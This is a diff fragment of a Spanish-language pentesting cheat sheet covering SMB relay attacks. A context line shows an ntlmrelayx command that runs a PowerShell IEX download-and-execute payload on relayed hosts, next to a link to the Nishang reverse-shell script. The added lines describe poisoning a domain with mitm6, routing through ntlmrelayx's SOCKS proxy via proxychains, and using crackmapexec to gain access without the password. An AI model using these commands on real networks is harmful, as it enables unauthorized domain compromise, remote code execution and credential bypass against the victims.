@@ -50,7 +50,8 @@ ntlmrelayx.py -tf <targets.txt> -smb2support -c "powershell IEX(New-Object Net.W
 [Descargar shell de Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
 
 # Ejecutar comandos mediante un SMB Relay por IPv6
-Primero envenenamos el dominio con `mitm6` para luego entrar en una sesión interactiva con `ntlmrelayx` y mediante el comando `socks` podremos ver las conexiones y el `AdminStatus` de los usuarios.
+Primero envenenamos el dominio con `mitm6` para luego entrar en una sesión interactiva con `ntlmrelayx` y mediante el comando `socks` podremos ver las conexiones y el `AdminStatus` de los usuarios. En el caso de obtener un usuario con `AdminStatus True` podremos  añadir en la sección `[ProxyList]` de proxychains `socks4 127.0.0.1 1080`
+y luego ejecutar el comando `proxychains cme smb <ip_victima> -u 'usuario' -d 'NombreDelDominio' -p 'daigual'` y ganaremos acceso al sistema sin saber la contraseña.
 ```
 mitm6 -d <dominio>
 ```
